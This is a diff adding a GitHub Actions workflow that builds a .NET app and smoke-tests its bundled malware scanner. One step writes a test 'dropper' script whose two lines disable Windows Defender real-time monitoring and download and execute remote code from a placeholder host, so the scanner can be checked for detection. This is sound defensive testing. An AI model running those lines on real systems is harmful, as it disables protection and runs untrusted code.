@@ -1,0 +1,125 @@
+name: build
+
+on:
+  push:
+    branches: ["**"]
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  # The fast gate. Nexus.Core is pure logic with no Windows dependencies, and the
+  # whole test suite lives there on purpose — so the thing that guards every merge
+  # runs in seconds on the cheapest runner available.
+  test:
+    name: Core tests (Linux)
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: "8.0.x"
+
+      - name: Restore
+        run: dotnet restore
+
+      # EnableWindowsTargeting in Directory.Build.props lets the WPF project compile
+      # here even though it cannot run, so a broken App-layer change still fails the
+      # build rather than surviving until someone opens Windows.
+      - name: Build
+        run: dotnet build --no-restore -c Release
+
+      - name: Test
+        run: dotnet test --no-build -c Release --verbosity normal
+
+  # Windows is where it actually ships, so the publish is verified on Windows and
+  # the resulting artifacts are exercised for real.
+  publish:
+    name: Publish and smoke-test (Windows)
+    runs-on: windows-latest
+    needs: test
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: "8.0.x"
+
+      - name: Publish
+        run: dotnet publish src/Nexus.App -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
+
+      # The publish target fails outright if the scanner is missing, but assert it
+      # here too: shipping without a scanner disables file scanning silently, and
+      # silence is exactly what CI is for.
+      - name: Both binaries are present
+        shell: pwsh
+        run: |
+          $pub = "src/Nexus.App/bin/Release/net8.0-windows/win-x64/publish"
+          foreach ($f in @("Nexus.exe", "Nexus.Scanner.exe", "assets/patterns.txt")) {
+            if (-not (Test-Path "$pub/$f")) { throw "missing from publish output: $f" }
+          }
+          Get-ChildItem $pub -Recurse -File |
+            Select-Object Name, @{n='MB';e={[math]::Round($_.Length/1MB,2)}} | Format-Table
+
+      - name: Scanner reports its engines
+        shell: pwsh
+        run: |
+          $pub = "src/Nexus.App/bin/Release/net8.0-windows/win-x64/publish"
+          $engines = & "$pub/Nexus.Scanner.exe" --self-test
+          Write-Host "engines: $engines"
+          foreach ($e in @("PE structure", "script analysis", "archive contents")) {
+            if ($engines -notlike "*$e*") { throw "engine not available: $e" }
+          }
+
+      # End-to-end through the real worker: it must find what it should, stay quiet
+      # on what it should, and survive malformed input without dying.
+      - name: Scanner detects, stays quiet, and survives bad input
+        shell: pwsh
+        run: |
+          $pub = "src/Nexus.App/bin/Release/net8.0-windows/win-x64/publish"
+          $work = New-Item -ItemType Directory -Force -Path "${{ runner.temp }}/scan"
+
+          Set-Content "$work/dropper.ps1" -NoNewline -Value @'
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          iex ((New-Object Net.WebClient).DownloadString('http://example.invalid/x'))
+          '@
+          Set-Content "$work/notaprogram.exe" -NoNewline -Value "this is plainly not a PE file"
+
+          $reqs = @(
+            '{"Id":"clean","Path":"C:/Windows/System32/notepad.exe"}'
+            '{"Id":"script","Path":"' + ($work.FullName -replace '\\','/') + '/dropper.ps1"}'
+            '{"Id":"fake","Path":"' + ($work.FullName -replace '\\','/') + '/notaprogram.exe"}'
+            '{"Id":"gone","Path":"C:/does/not/exist.exe"}'
+            '{"Id":"bad","Path":'
+          ) -join "`n"
+
+          $out = $reqs | & "$pub/Nexus.Scanner.exe"
+          $out | ForEach-Object { Write-Host $_ }
+
+          $results = @{}
+          $out | ForEach-Object { $o = $_ | ConvertFrom-Json; $results[$o.Id] = $o }
+
+          if ($results['clean'].Signals.Count -ne 0) {
+            throw "a signed Windows binary should produce no findings"
+          }
+          if ($results['script'].Signals.Count -lt 2) {
+            throw "the obfuscated dropper should produce several findings"
+          }
+          if (($results['fake'].Signals | ForEach-Object { $_.Code }) -notcontains 'pe-not-an-executable') {
+            throw "an extension/content mismatch should be reported"
+          }
+          if (-not $results['gone'].Error) { throw "a missing file should return an error" }
+          if ($out.Count -ne 5) { throw "malformed input should still produce a reply, not a crash" }
+
+          Write-Host "scanner behaved correctly on all five cases"
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: nexus-win-x64
+          path: src/Nexus.App/bin/Release/net8.0-windows/win-x64/publish/
+          retention-days: 14
